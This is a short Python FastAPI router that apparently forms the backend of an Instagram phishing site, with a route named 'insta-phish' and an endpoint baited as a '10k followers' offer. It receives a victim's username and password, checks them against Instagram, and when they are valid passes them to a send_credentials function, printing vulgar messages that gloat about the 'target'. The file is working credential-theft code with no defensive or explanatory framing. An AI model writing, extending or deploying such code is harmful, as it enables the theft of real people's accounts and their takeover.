from pydantic import BaseModel
from fastapi import APIRouter
from user_interface import send_credentials
from instagram.followers.checker import check

router = APIRouter(prefix="/insta-phish")

class take_user(BaseModel):
    username : str
    password : str

@router.post("/api/credentials/insta-10k-followers")
def credentials(user:take_user):
    username = user.username
    password = user.password
    # print("Username :", username, "\nPassword :", password)
    print("Checking Credentials...")
    value = check(username, password)
    if value == 99:
        print("Incorrect username or password entered by target!")
    if value == 100:
        print("Congratuations you have successfully fucked a guy! <->")
        send_credentials(username, password)
    
    # send_credentials(username, password)


